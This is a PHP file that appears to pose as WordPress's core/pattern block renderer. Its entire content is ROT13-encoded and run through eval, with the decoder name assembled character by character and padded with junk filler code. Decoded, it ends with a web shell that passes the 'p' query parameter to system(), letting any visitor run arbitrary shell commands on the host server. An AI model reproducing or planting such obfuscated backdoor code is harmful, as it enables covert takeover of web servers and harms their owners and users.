<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cnggrea` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 *  Ertvfgref gur `pber/cnggrea` oybpx ba gur freire.
 *
 * @fvapr 5.9.0
 */
shapgvba ertvfgre_oybpx_pber_cnggrea() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cnggrea',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cnggrea',
		)
	);
}

/**
 * Eraqref gur `pber/cnggrea` oybpx ba gur freire.
 *
 * @fvapr 6.3.0 Onpxjneqf pbzcngvovyvgl: oybpxf jvgu ab `flapFgnghf` nggevohgr qb abg erprvir oybpx jenccre.
 *
 * @tybony JC_Rzorq $jc_rzorq Hfrq gb cebprff rzorqqrq pbagrag jvguva cnggreaf
 *
 * @cnenz neenl $nggevohgrf Oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur bhgchg bs gur cnggrea.
 */
shapgvba eraqre_oybpx_pber_cnggrea( $nggevohgrf ) {
	fgngvp $frra_ersf = neenl();

	vs ( rzcgl( $nggevohgrf['fyht'] ) ) {
		erghea '';
	}

	$fyht     = $nggevohgrf['fyht'];
	$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();

	vs ( ! $ertvfgel->vf_ertvfgrerq( $fyht ) ) {
		erghea '';
	}

	vs ( vffrg( $frra_ersf[ $nggevohgrf['fyht'] ] ) ) {
		// JC_QROHT_QVFCYNL zhfg bayl or ubaberq jura JC_QROHT. Guvf cerprqrag
		// vf frg va `jc_qroht_zbqr()`.
		$vf_qroht = JC_QROHT && JC_QROHT_QVFCYNL;

		erghea $vf_qroht ?
			// genafyngbef: Ivfvoyr bayl va gur sebag raq, guvf jneavat gnxrf gur cynpr bs n snhygl oybpx. %f ercerfragf n cnggrea'f fyht.
			fcevags( __( '[oybpx eraqrevat unygrq sbe cnggrea \"%f\"]' ), $fyht ) :
			'';
	}

	$cnggrea = $ertvfgel->trg_ertvfgrerq( $fyht );
	$pbagrag = $cnggrea['pbagrag'];

	$frra_ersf[ $nggevohgrf['fyht'] ] = gehr;

	$pbagrag = qb_oybpxf( $pbagrag );

	tybony $jc_rzorq;
	$pbagrag = $jc_rzorq->nhgbrzorq( $pbagrag );

	hafrg( $frra_ersf[ $nggevohgrf['fyht'] ] );
	erghea $pbagrag;
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cnggrea' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>